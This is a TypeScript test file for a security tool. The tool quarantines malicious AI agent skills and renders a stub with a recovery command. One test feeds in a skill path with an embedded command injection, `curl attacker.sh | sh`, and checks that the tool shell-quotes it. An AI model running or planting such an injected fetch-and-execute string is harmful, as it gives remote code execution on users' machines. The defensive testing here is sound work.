import { describe, expect, it } from 'vitest'

import { renderStub } from '../stubTemplate'

describe('renderStub', () => {
  const base = {
    md5: 'a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4',
    quarantinedZipPath:
      '/home/u/.tracy/quarantine/claude/skills/a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4.zip',
    origPath: '/proj/.claude/skills/evil',
    summary: 'eval(curl) pattern in setup.sh',
    scannerName: 'mobb-internal',
    scannerVersion: 'abcdef1234567890',
    scannedAt: '2026-04-22T08:00:00.000Z',
  }

  it('renders all fields for folder skill', () => {
    const out = renderStub({ ...base, isFolder: true })
    expect(out).toContain('# ⛔ QUARANTINED BY TRACY')
    expect(out).toContain(base.md5)
    expect(out).toContain(base.quarantinedZipPath)
    expect(out).toContain(base.origPath)
    expect(out).toContain(base.summary)
    expect(out).toContain(base.scannerName)
    expect(out).toContain(base.scannerVersion)
    expect(out).toContain(base.scannedAt)
  })

  it('uses "skill file" wording for standalone skill', () => {
    const out = renderStub({ ...base, isFolder: false })
    expect(out).toContain('original skill file has been archived')
    expect(out).not.toContain('original skill folder has been archived')
  })

  it('uses "skill folder" wording for folder skill', () => {
    const out = renderStub({ ...base, isFolder: true })
    expect(out).toContain('original skill folder has been archived')
    expect(out).not.toContain('original skill file has been archived')
  })

  it('falls back when summary is null (legacy row)', () => {
    const out = renderStub({ ...base, isFolder: true, summary: null })
    expect(out).toContain('not available (scan predates current schema)')
  })

  it('includes a copy-paste recovery recipe (rm + unzip)', () => {
    const out = renderStub({ ...base, isFolder: true })
    expect(out).toContain(
      `rm -rf ${base.origPath} && unzip -o ${base.quarantinedZipPath} -d /proj/.claude/skills`
    )
  })

  it('neutralizes shell metacharacters in attacker-controlled skill names', () => {
    // A malicious skill folder literally named `evil'"; curl attacker.sh |
    // sh #` would, without sanitization, render a copy-pasteable RCE into
    // the recovery line. Both a single and double quote are embedded so
    // shell-quote picks double-quoting and backslash-escapes the inner `"`.
    // Expected strings are hardcoded literals (not template-interpolated
    // from inputs) so swapping out shell-quote or drifting the template
    // is caught immediately.
    const out = renderStub({
      ...base,
      isFolder: true,
      origPath: `/proj/.claude/skills/evil'"; curl attacker.sh | sh #`,
    })
    // Unquoted, injectable form must not appear.
    expect(out).not.toContain(
      `rm -rf /proj/.claude/skills/evil'"; curl attacker.sh | sh #`
    )
    // Properly quoted: double-quoted with inner `"` → `\"`.
    expect(out).toContain(
      `rm -rf "/proj/.claude/skills/evil'\\"; curl attacker.sh | sh #"`
    )
    // Parent directory is computed via path.dirname on the (injected) origPath,
    // which yields `/proj/.claude/skills`.
    expect(out).toContain(`-d /proj/.claude/skills`)
  })
})
